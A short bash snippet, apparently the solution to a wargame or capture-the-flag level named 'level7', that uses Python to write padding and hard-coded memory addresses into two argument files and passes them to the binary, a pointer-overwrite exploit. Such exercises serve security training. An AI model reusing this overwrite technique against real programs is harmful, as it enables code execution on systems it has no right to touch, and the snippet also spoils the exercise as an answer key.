```bash
python -c "print('A'*16 + '\x10'*4 + '\x3c\xf7\xff\xbf')" > /tmp/arg1
python -c "print('\xfa\x84\x04\x08')" > /tmp/arg2
./level7 `cat /tmp/arg1` `cat /tmp/arg2`
```